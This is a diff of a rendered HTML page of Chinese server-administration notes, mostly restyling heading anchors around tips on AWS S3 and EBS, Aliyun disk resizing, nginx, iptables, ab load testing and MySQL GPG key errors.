+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h2>
+<ul>
 <li>此项未校验,来源于<code>chatgpt</code></li>
 </ul>
 <div class="highlight"><div class="chroma">
@@ -1638,8 +1802,14 @@
 </span></span><span class="line"><span class="cl"><span class="nt">&lt;/configuration&gt;</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="find-文件性能提升" class="headerLink">
-    <a href="#find-%e6%96%87%e4%bb%b6%e6%80%a7%e8%83%bd%e6%8f%90%e5%8d%87" class="header-mark"></a>find 文件性能提升</h2><div class="highlight"><div class="chroma">
+</div><h2 id="find-文件性能提升">
+  find 文件性能提升
+  <a class="heading-link" href="#find-%e6%96%87%e4%bb%b6%e6%80%a7%e8%83%bd%e6%8f%90%e5%8d%87">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h2>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -1649,8 +1819,14 @@
 </span></span><span class="line"><span class="cl">$&gt; find /path/to/directory -type f -name <span class="s2">&#34;*.txt&#34;</span> -exec ls -l <span class="o">{}</span> <span class="se">\;</span> <span class="p">|</span> grep <span class="s2">&#34;pattern&#34;</span> <span class="p">|</span> xargs rm
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="压力测试-ab-命令解释" class="headerLink">
-    <a href="#%e5%8e%8b%e5%8a%9b%e6%b5%8b%e8%af%95-ab-%e5%91%bd%e4%bb%a4%e8%a7%a3%e9%87%8a" class="header-mark"></a>压力测试 `ab`` 命令解释</h2><div class="highlight"><div class="chroma">
+</div><h2 id="压力测试-ab-命令解释">
+  压力测试 `ab`` 命令解释
+  <a class="heading-link" href="#%e5%8e%8b%e5%8a%9b%e6%b5%8b%e8%af%95-ab-%e5%91%bd%e4%bb%a4%e8%a7%a3%e9%87%8a">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h2>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -1668,24 +1844,42 @@
 </span></span><span class="line"><span class="cl">$&gt; ab -n <span class="m">5000</span> -c <span class="m">50</span> -r http://www.example.com/
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="https页面加载http资源报错的方法" class="headerLink">
-    <a href="#https%e9%a1%b5%e9%9d%a2%e5%8a%a0%e8%bd%bdhttp%e8%b5%84%e6%ba%90%e6%8a%a5%e9%94%99%e7%9a%84%e6%96%b9%e6%b3%95" class="header-mark"></a>https页面加载http资源报错的方法</h2><p>解决方案:</p>
+</div><h2 id="https页面加载http资源报错的方法">
+  https页面加载http资源报错的方法
+  <a class="heading-link" href="#https%e9%a1%b5%e9%9d%a2%e5%8a%a0%e8%bd%bdhttp%e8%b5%84%e6%ba%90%e6%8a%a5%e9%94%99%e7%9a%84%e6%96%b9%e6%b3%95">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h2>
+<p>解决方案:</p>
 <ol>
 <li>服务端设置<code>header</code>: <code>header(&quot;Content-Security-Policy: upgrade-insecure-requests&quot;);</code></li>
 <li>页面设置<code>meta</code>头: <code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;upgrade-insecure-requests&quot; /&gt;</code></li>
 <li>删除链接中的协议头: <code>&lt;script src='//cdn.bootcss.com/jquery/3.3.1/jquery.min.js'&gt;&lt;/script&gt;</code></li>
 <li><code>nginx</code>添加<code>header</code>: <code>add_header Content-Security-Policy &quot;upgrade-insecure-requests&quot;;</code></li>
 </ol>
-<h2 id="mysql-授权-all-privileges-时当前用户是具备执行-alter-user-的权限的但仅限于修改自己的密码无法修改其他用户" class="headerLink">
-    <a href="#mysql-%e6%8e%88%e6%9d%83-all-privileges-%e6%97%b6%e5%bd%93%e5%89%8d%e7%94%a8%e6%88%b7%e6%98%af%e5%85%b7%e5%a4%87%e6%89%a7%e8%a1%8c-alter-user-%e7%9a%84%e6%9d%83%e9%99%90%e7%9a%84%e4%bd%86%e4%bb%85%e9%99%90%e4%ba%8e%e4%bf%ae%e6%94%b9%e8%87%aa%e5%b7%b1%e7%9a%84%e5%af%86%e7%a0%81%e6%97%a0%e6%b3%95%e4%bf%ae%e6%94%b9%e5%85%b6%e4%bb%96%e7%94%a8%e6%88%b7" class="header-mark"></a>mysql 授权 ALL PRIVILEGES 时，当前用户是具备执行 ALTER USER 的权限的，但仅限于修改自己的密码，无法修改其他用户</h2><h2 id="windows-iis-反向代理配置" class="headerLink">
-    <a href="#windows-iis-%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86%e9%85%8d%e7%bd%ae" class="header-mark"></a>Windows IIS 反向代理配置</h2><blockquote>
-<p><a href="https://github.com/axllent/mailpit/issues/131" target="_blank" rel="noopener noreferrer">https://github.com/axllent/mailpit/issues/131</a></p>
+<h2 id="mysql-授权-all-privileges-时当前用户是具备执行-alter-user-的权限的但仅限于修改自己的密码无法修改其他用户">
+  mysql 授权 ALL PRIVILEGES 时，当前用户是具备执行 ALTER USER 的权限的，但仅限于修改自己的密码，无法修改其他用户
+  <a class="heading-link" href="#mysql-%e6%8e%88%e6%9d%83-all-privileges-%e6%97%b6%e5%bd%93%e5%89%8d%e7%94%a8%e6%88%b7%e6%98%af%e5%85%b7%e5%a4%87%e6%89%a7%e8%a1%8c-alter-user-%e7%9a%84%e6%9d%83%e9%99%90%e7%9a%84%e4%bd%86%e4%bb%85%e9%99%90%e4%ba%8e%e4%bf%ae%e6%94%b9%e8%87%aa%e5%b7%b1%e7%9a%84%e5%af%86%e7%a0%81%e6%97%a0%e6%b3%95%e4%bf%ae%e6%94%b9%e5%85%b6%e4%bb%96%e7%94%a8%e6%88%b7">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h2>
+<h2 id="windows-iis-反向代理配置">
+  Windows IIS 反向代理配置
+  <a class="heading-link" href="#windows-iis-%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86%e9%85%8d%e7%bd%ae">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h2>
+<blockquote>
+<p><a href="https://github.com/axllent/mailpit/issues/131"  class="external-link" target="_blank" rel="noopener">https://github.com/axllent/mailpit/issues/131</a></p>
 </blockquote>
 <ol>
 <li>前置条件
 <ul>
-<li>安装 <a href="https://www.iis.net/downloads/microsoft/url-rewrite" target="_blank" rel="noopener noreferrer"><code>url-rewrite</code></a> 模块</li>
-<li>安装 <a href="https://www.iis.net/downloads/microsoft/application-request-routing" target="_blank" rel="noopener noreferrer"><code>application-request-routing</code></a> 模块(此项安装前，必须先安装 <code>url-rewrite</code> 模块)</li>
+<li>安装 <a href="https://www.iis.net/downloads/microsoft/url-rewrite"  class="external-link" target="_blank" rel="noopener"><code>url-rewrite</code></a> 模块</li>
+<li>安装 <a href="https://www.iis.net/downloads/microsoft/application-request-routing"  class="external-link" target="_blank" rel="noopener"><code>application-request-routing</code></a> 模块(此项安装前，必须先安装 <code>url-rewrite</code> 模块)</li>
 </ul>
 </li>
 <li>配置
@@ -1695,16 +1889,28 @@
 </ul>
 </li>
 </ol>
-<h2 id="亚马逊存储桶" class="headerLink">
-    <a href="#%e4%ba%9a%e9%a9%ac%e9%80%8a%e5%ad%98%e5%82%a8%e6%a1%b6" class="header-mark"></a>亚马逊存储桶</h2><p><em><strong>新建存储通无论是公开或私有，应优先考虑以下规则</strong></em></p>
+<h2 id="亚马逊存储桶">
+  亚马逊存储桶
+  <a class="heading-link" href="#%e4%ba%9a%e9%a9%ac%e9%80%8a%e5%ad%98%e5%82%a8%e6%a1%b6">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h2>
+<p><em><strong>新建存储通无论是公开或私有，应优先考虑以下规则</strong></em></p>
 <ol>
 <li>创建存储桶(可公有访问权限)</li>
 <li>设置&quot;对象所有权&quot;为<code>ACL已启用</code></li>
 <li>设置&quot;对象所有权&quot;为<code>存储桶拥有者优先</code>。</li>
 <li>将 <code>此存储桶的“屏蔽公共访问权限”设置</code>取消<code>阻止所有公开访问</code>勾选，只勾选<code>阻止通过新公有存储桶策略或接入点策略授予的存储桶和对象公有访问</code>和<code>阻止通过任何公有存储桶策略或接入点策略对存储桶和对象的公有和跨账户访问</code>，其他默认即可</li>
 </ol>
-<h3 id="存储桶规则创建及示例" class="headerLink">
-    <a href="#%e5%ad%98%e5%82%a8%e6%a1%b6%e8%a7%84%e5%88%99%e5%88%9b%e5%bb%ba%e5%8f%8a%e7%a4%ba%e4%be%8b" class="header-mark"></a>存储桶规则创建及示例</h3><ul>
+<h3 id="存储桶规则创建及示例">
+  存储桶规则创建及示例
+  <a class="heading-link" href="#%e5%ad%98%e5%82%a8%e6%a1%b6%e8%a7%84%e5%88%99%e5%88%9b%e5%bb%ba%e5%8f%8a%e7%a4%ba%e4%be%8b">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h3>
+<ul>
 <li>
 <p>存储桶策略</p>
 <div class="highlight"><div class="chroma">
@@ -1787,8 +1993,14 @@
 </div>
 </div></li>
 </ul>
-<h3 id="亚马逊用户策略" class="headerLink">
-    <a href="#%e4%ba%9a%e9%a9%ac%e9%80%8a%e7%94%a8%e6%88%b7%e7%ad%96%e7%95%a5" class="header-mark"></a>亚马逊用户策略</h3><div class="highlight"><div class="chroma">
+<h3 id="亚马逊用户策略">
+  亚马逊用户策略
+  <a class="heading-link" href="#%e4%ba%9a%e9%a9%ac%e9%80%8a%e7%94%a8%e6%88%b7%e7%ad%96%e7%95%a5">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h3>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1884,8 +2096,14 @@
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="gnome-shell-终端设置-title" class="headerLink">
-    <a href="#gnome-shell-%e7%bb%88%e7%ab%af%e8%ae%be%e7%bd%ae-title" class="header-mark"></a>gnome-shell 终端设置 title</h2><div class="highlight"><div class="chroma">
+</div><h2 id="gnome-shell-终端设置-title">
+  gnome-shell 终端设置 title
+  <a class="heading-link" href="#gnome-shell-%e7%bb%88%e7%ab%af%e8%ae%be%e7%bd%ae-title">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h2>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
@@ -1893,8 +2111,14 @@
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$&gt; <span class="nb">export</span> <span class="nv">PROMPT_COMMAND</span><span class="o">=</span><span class="s1">&#39;echo -ne &#34;\033]0; ${USER}@${HOSTNAME} \007&#34;&#39;</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="阿里云安装-alinux-操作系统安装-docker" class="headerLink">
-    <a href="#%e9%98%bf%e9%87%8c%e4%ba%91%e5%ae%89%e8%a3%85-alinux-%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e5%ae%89%e8%a3%85-docker" class="header-mark"></a>阿里云安装 alinux 操作系统安装 docker</h2><div class="highlight"><div class="chroma">
+</div><h2 id="阿里云安装-alinux-操作系统安装-docker">
+  阿里云安装 alinux 操作系统安装 docker
+  <a class="heading-link" href="#%e9%98%bf%e9%87%8c%e4%ba%91%e5%ae%89%e8%a3%85-alinux-%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e5%ae%89%e8%a3%85-docker">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h2>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -1916,8 +2140,14 @@
 </span></span><span class="line"><span class="cl">$&gt; sudo dnf -y install dnf-plugin-releasever-adapter --repo alinux3-plus    <span class="c1"># 兼容插件</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="亚马逊cdn-添加-elb-作为后端源指定多备用域名无效有其他衍生问题-待继续测试" class="headerLink">
-    <a href="#%e4%ba%9a%e9%a9%ac%e9%80%8acdn-%e6%b7%bb%e5%8a%a0-elb-%e4%bd%9c%e4%b8%ba%e5%90%8e%e7%ab%af%e6%ba%90%e6%8c%87%e5%ae%9a%e5%a4%9a%e5%a4%87%e7%94%a8%e5%9f%9f%e5%90%8d%e6%97%a0%e6%95%88%e6%9c%89%e5%85%b6%e4%bb%96%e8%a1%8d%e7%94%9f%e9%97%ae%e9%a2%98-%e5%be%85%e7%bb%a7%e7%bb%ad%e6%b5%8b%e8%af%95" class="header-mark"></a>亚马逊cdn 添加 elb 作为后端源，指定多备用域名无效(有其他衍生问题, 待继续测试)</h2><ul>
+</div><h2 id="亚马逊cdn-添加-elb-作为后端源指定多备用域名无效有其他衍生问题-待继续测试">
+  亚马逊cdn 添加 elb 作为后端源，指定多备用域名无效(有其他衍生问题, 待继续测试)
+  <a class="heading-link" href="#%e4%ba%9a%e9%a9%ac%e9%80%8acdn-%e6%b7%bb%e5%8a%a0-elb-%e4%bd%9c%e4%b8%ba%e5%90%8e%e7%ab%af%e6%ba%90%e6%8c%87%e5%ae%9a%e5%a4%9a%e5%a4%87%e7%94%a8%e5%9f%9f%e5%90%8d%e6%97%a0%e6%95%88%e6%9c%89%e5%85%b6%e4%bb%96%e8%a1%8d%e7%94%9f%e9%97%ae%e9%a2%98-%e5%be%85%e7%bb%a7%e7%bb%ad%e6%b5%8b%e8%af%95">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h2>
+<ul>
 <li>问题体现: 亚马逊添加<code>cdn</code>分配后，指向源站为<code>elb</code>，此时<code>cdn</code>配置多个备用域名，正常解析后，无论访问的是哪个备用域名，他们请求的最终站点始终是一个。</li>
 <li>问题分析:
 <ul>
@@ -1930,8 +2160,14 @@
 </ul>
 </li>
 </ul>
-<h1 id="亚马逊调整-ebs-卷大小后扩展文件系统磁盘扩容" class="headerLink">
-    <a href="#%e4%ba%9a%e9%a9%ac%e9%80%8a%e8%b0%83%e6%95%b4-ebs-%e5%8d%b7%e5%a4%a7%e5%b0%8f%e5%90%8e%e6%89%a9%e5%b1%95%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f%e7%a3%81%e7%9b%98%e6%89%a9%e5%ae%b9" class="header-mark"></a>亚马逊调整 EBS 卷大小后扩展文件系统(磁盘扩容)</h1><div class="highlight"><div class="chroma">
+<h1 id="亚马逊调整-ebs-卷大小后扩展文件系统磁盘扩容">
+  亚马逊调整 EBS 卷大小后扩展文件系统(磁盘扩容)
+  <a class="heading-link" href="#%e4%ba%9a%e9%a9%ac%e9%80%8a%e8%b0%83%e6%95%b4-ebs-%e5%8d%b7%e5%a4%a7%e5%b0%8f%e5%90%8e%e6%89%a9%e5%b1%95%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f%e7%a3%81%e7%9b%98%e6%89%a9%e5%ae%b9">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1967,9 +2203,15 @@
 </span></span><span class="line"><span class="cl">$&gt; sudo resize2fs /dev/nvme0n1p1
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="亚马逊加速器配置" class="headerLink">
-    <a href="#%e4%ba%9a%e9%a9%ac%e9%80%8a%e5%8a%a0%e9%80%9f%e5%99%a8%e9%85%8d%e7%bd%ae" class="header-mark"></a>亚马逊加速器配置</h1><blockquote>
-<p><a href="https://docs.aws.amazon.com/zh_cn/global-accelerator/latest/dg/what-is-global-accelerator.html" target="_blank" rel="noopener noreferrer">https://docs.aws.amazon.com/zh_cn/global-accelerator/latest/dg/what-is-global-accelerator.html</a></p>
+</div><h1 id="亚马逊加速器配置">
+  亚马逊加速器配置
+  <a class="heading-link" href="#%e4%ba%9a%e9%a9%ac%e9%80%8a%e5%8a%a0%e9%80%9f%e5%99%a8%e9%85%8d%e7%bd%ae">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<blockquote>
+<p><a href="https://docs.aws.amazon.com/zh_cn/global-accelerator/latest/dg/what-is-global-accelerator.html"  class="external-link" target="_blank" rel="noopener">https://docs.aws.amazon.com/zh_cn/global-accelerator/latest/dg/what-is-global-accelerator.html</a></p>
 </blockquote>
 <p><code>AWS Global Accelerator</code>可以提高全球受众使用的 <code>Internet</code> 应用程序的可用性。使用标准加速器，全球加速器将 <code>AWS</code> 全球网络的流量引导到离客户端最近的区域中的终端节点。 本节主要说明<code>标准加速</code></p>
 <ul>
@@ -1985,9 +2227,15 @@
 </ul>
 <p><code>加速器</code>创建完成后会提供一个<code>dns</code>地址，将需要加速的域名直接解析上去即可。</p>
 <p><code>AWS Global Accelerator</code>的功能和<code>cdn</code>类似，但效果比<code>cdn</code>好, 费用肯定要更高一些了。他还可以实现端口转发等其他的功能，可以自行参悟。</p>
-<h1 id="阿里云磁盘分区扩容" class="headerLink">
-    <a href="#%e9%98%bf%e9%87%8c%e4%ba%91%e7%a3%81%e7%9b%98%e5%88%86%e5%8c%ba%e6%89%a9%e5%ae%b9" class="header-mark"></a>阿里云磁盘分区扩容</h1><blockquote>
-<p><a href="https://help.aliyun.com/zh/ecs/user-guide/step-2-resize-partitions-and-file-systems/?spm=a2c4g.11186623.0.0.5a193a8aP9JIh1" target="_blank" rel="noopener noreferrer">https://help.aliyun.com/zh/ecs/user-guide/step-2-resize-partitions-and-file-systems/?spm=a2c4g.11186623.0.0.5a193a8aP9JIh1</a></p>
+<h1 id="阿里云磁盘分区扩容">
+  阿里云磁盘分区扩容
+  <a class="heading-link" href="#%e9%98%bf%e9%87%8c%e4%ba%91%e7%a3%81%e7%9b%98%e5%88%86%e5%8c%ba%e6%89%a9%e5%ae%b9">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<blockquote>
+<p><a href="https://help.aliyun.com/zh/ecs/user-guide/step-2-resize-partitions-and-file-systems/?spm=a2c4g.11186623.0.0.5a193a8aP9JIh1"  class="external-link" target="_blank" rel="noopener">https://help.aliyun.com/zh/ecs/user-guide/step-2-resize-partitions-and-file-systems/?spm=a2c4g.11186623.0.0.5a193a8aP9JIh1</a></p>
 </blockquote>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -2037,13 +2285,25 @@
 </span></span><span class="line"><span class="cl">$&gt; sudo resize2fs /dev/vdc 
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="网络故障记录" class="headerLink">
-    <a href="#%e7%bd%91%e7%bb%9c%e6%95%85%e9%9a%9c%e8%ae%b0%e5%bd%95" class="header-mark"></a>网络故障记录</h1><ul>
+</div><h1 id="网络故障记录">
+  网络故障记录
+  <a class="heading-link" href="#%e7%bd%91%e7%bb%9c%e6%95%85%e9%9a%9c%e8%ae%b0%e5%bd%95">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<ul>
 <li><code>症状</code>：局域网机器网络故障，时好时坏。故障时候无法<code>ping</code>通网关(无法获取响应)，但可以<code>ping</code>通同网段的其他主机，也可以与其他主机正常通信。</li>
 <li><code>原因</code>：当前主机是通过手动配置<code>ip</code>，而局域网<code>ip</code>是路由自动分配的，有其他同事在连接时候占用了当前主机配置的<code>ip</code>，从而<code>ip</code>重复导致了上诉问题。</li>
 </ul>
-<h1 id="linux-桌面环境下绑定指定唤起协议" class="headerLink">
-    <a href="#linux-%e6%a1%8c%e9%9d%a2%e7%8e%af%e5%a2%83%e4%b8%8b%e7%bb%91%e5%ae%9a%e6%8c%87%e5%ae%9a%e5%94%a4%e8%b5%b7%e5%8d%8f%e8%ae%ae" class="header-mark"></a>linux 桌面环境下，绑定指定唤起协议</h1><ul>
+<h1 id="linux-桌面环境下绑定指定唤起协议">
+  linux 桌面环境下，绑定指定唤起协议
+  <a class="heading-link" href="#linux-%e6%a1%8c%e9%9d%a2%e7%8e%af%e5%a2%83%e4%b8%8b%e7%bb%91%e5%ae%9a%e6%8c%87%e5%ae%9a%e5%94%a4%e8%b5%b7%e5%8d%8f%e8%ae%ae">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<ul>
 <li>例如 <code>mailto://</code> 唤起指定的邮件应用,下面以<code>he3</code>的<code>appimage</code>程序为例</li>
 </ul>
 <div class="highlight"><div class="chroma">
@@ -2098,8 +2358,14 @@
 </span></span><span class="line"><span class="cl">$&gt; xdg-mime query default x-scheme-handler/he3
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="解决-virtualbox-仅主机模式无法定制ip网段的问题仅主机模式无法连接公网的问题" class="headerLink">
-    <a href="#%e8%a7%a3%e5%86%b3-virtualbox-%e4%bb%85%e4%b8%bb%e6%9c%ba%e6%a8%a1%e5%bc%8f%e6%97%a0%e6%b3%95%e5%ae%9a%e5%88%b6ip%e7%bd%91%e6%ae%b5%e7%9a%84%e9%97%ae%e9%a2%98%e4%bb%85%e4%b8%bb%e6%9c%ba%e6%a8%a1%e5%bc%8f%e6%97%a0%e6%b3%95%e8%bf%9e%e6%8e%a5%e5%85%ac%e7%bd%91%e7%9a%84%e9%97%ae%e9%a2%98" class="header-mark"></a>解决 Virtualbox 仅主机模式无法定制IP网段的问题(仅主机模式无法连接公网的问题)</h1><p><strong>此方案只适合<code>linux</code>桌面系统，<code>windows</code>理论可参考设定</strong></p>
+</div><h1 id="解决-virtualbox-仅主机模式无法定制ip网段的问题仅主机模式无法连接公网的问题">
+  解决 Virtualbox 仅主机模式无法定制IP网段的问题(仅主机模式无法连接公网的问题)
+  <a class="heading-link" href="#%e8%a7%a3%e5%86%b3-virtualbox-%e4%bb%85%e4%b8%bb%e6%9c%ba%e6%a8%a1%e5%bc%8f%e6%97%a0%e6%b3%95%e5%ae%9a%e5%88%b6ip%e7%bd%91%e6%ae%b5%e7%9a%84%e9%97%ae%e9%a2%98%e4%bb%85%e4%b8%bb%e6%9c%ba%e6%a8%a1%e5%bc%8f%e6%97%a0%e6%b3%95%e8%bf%9e%e6%8e%a5%e5%85%ac%e7%bd%91%e7%9a%84%e9%97%ae%e9%a2%98">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<p><strong>此方案只适合<code>linux</code>桌面系统，<code>windows</code>理论可参考设定</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -2198,12 +2464,24 @@
 </span></span><span class="line"><span class="cl">$&gt; sudo iptables -A FORWARD -i wlp0s20f3 -o br-vbox0 -m state --state RELATED,ESTABLISHED -j ACCEPT
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="grafana-查询错误-a-got-error-input-data-must-be-a-wide-series-but-got-type-long-input-refid" class="headerLink">
-    <a href="#grafana-%e6%9f%a5%e8%af%a2%e9%94%99%e8%af%af-a-got-error-input-data-must-be-a-wide-series-but-got-type-long-input-refid" class="header-mark"></a>grafana 查询错误 <code>[A] got error: input data must be a wide series but got type long (input refid)</code></h1><ul>
+</div><h1 id="grafana-查询错误-a-got-error-input-data-must-be-a-wide-series-but-got-type-long-input-refid">
+  grafana 查询错误 <code>[A] got error: input data must be a wide series but got type long (input refid)</code>
+  <a class="heading-link" href="#grafana-%e6%9f%a5%e8%af%a2%e9%94%99%e8%af%af-a-got-error-input-data-must-be-a-wide-series-but-got-type-long-input-refid">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<ul>
 <li>这个问题是在配置<code>grafana</code>警报规则时出现的，实际上这儿添加的是表达式，而不是查询标签，统计出来的结果只能是数字(看看<code>prometheus</code>的<code>graph</code>面板 )</li>
 </ul>
-<h1 id="通过yum安装的mysql进行升级的时候报错-xxx-fileetcpkirpm-gpgrpm-gpg-key-mysql" class="headerLink">
-    <a href="#%e9%80%9a%e8%bf%87yum%e5%ae%89%e8%a3%85%e7%9a%84mysql%e8%bf%9b%e8%a1%8c%e5%8d%87%e7%ba%a7%e7%9a%84%e6%97%b6%e5%80%99%e6%8a%a5%e9%94%99-xxx-fileetcpkirpm-gpgrpm-gpg-key-mysql" class="header-mark"></a>通过yum安装的mysql进行升级的时候报错 <code>xxx file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql</code></h1><p>这个错误多数出现在yum安装 <code>mysql5.6</code>、<code>5.7</code> 时<br>
+<h1 id="通过yum安装的mysql进行升级的时候报错-xxx-fileetcpkirpm-gpgrpm-gpg-key-mysql">
+  通过yum安装的mysql进行升级的时候报错 <code>xxx file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql</code>
+  <a class="heading-link" href="#%e9%80%9a%e8%bf%87yum%e5%ae%89%e8%a3%85%e7%9a%84mysql%e8%bf%9b%e8%a1%8c%e5%8d%87%e7%ba%a7%e7%9a%84%e6%97%b6%e5%80%99%e6%8a%a5%e9%94%99-xxx-fileetcpkirpm-gpgrpm-gpg-key-mysql">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<p>这个错误多数出现在yum安装 <code>mysql5.6</code>、<code>5.7</code> 时<br>
 问题:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -2238,8 +2516,14 @@
 </span></span><span class="line"><span class="cl">$&gt; rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="nginx配置特定方法请求时进行密码认证" class="headerLink">
-    <a href="#nginx%e9%85%8d%e7%bd%ae%e7%89%b9%e5%ae%9a%e6%96%b9%e6%b3%95%e8%af%b7%e6%b1%82%e6%97%b6%e8%bf%9b%e8%a1%8c%e5%af%86%e7%a0%81%e8%ae%a4%e8%af%81" class="header-mark"></a>nginx配置特定方法请求时进行密码认证</h1><div class="highlight"><div class="chroma">
+</div><h1 id="nginx配置特定方法请求时进行密码认证">
+  nginx配置特定方法请求时进行密码认证
+  <a class="heading-link" href="#nginx%e9%85%8d%e7%bd%ae%e7%89%b9%e5%ae%9a%e6%96%b9%e6%b3%95%e8%af%b7%e6%b1%82%e6%97%b6%e8%bf%9b%e8%a1%8c%e5%af%86%e7%a0%81%e8%ae%a4%e8%af%81">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -2261,12 +2545,30 @@
 </span></span><span class="line"><span class="cl">    <span class="na">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="服务器资源不够导致的问题" class="headerLink">
-    <a href="#%e6%9c%8d%e5%8a%a1%e5%99%a8%e8%b5%84%e6%ba%90%e4%b8%8d%e5%a4%9f%e5%af%bc%e8%87%b4%e7%9a%84%e9%97%ae%e9%a2%98" class="header-mark"></a>服务器资源不够导致的问题</h1><p>   由于服务器上的<code>php</code>站点经常受到攻击，于是决定重新调整环境架构，给上个开源<code>waf</code>，部署一切正常，但是在站点正式运行的时，某个站点在访问一个查询页面时候，数据库的<code>cpu</code>使用率消耗疯狂上涨(几百倍)，开始以为是站点被传木马了，一直疯狂查代码，查了很久发现，结果是服务器资源不够，停了一些站点重新分配了下每个容器的资源使用后，目前看起来稳定了，2核8G内存跑了近60个<code>php</code>站点，不知道这是个什么水准的服务器，还是我太水优化不了😂😂😂。</p>
-<h1 id="通过systemd服务配置文件修改进程优先级" class="headerLink">
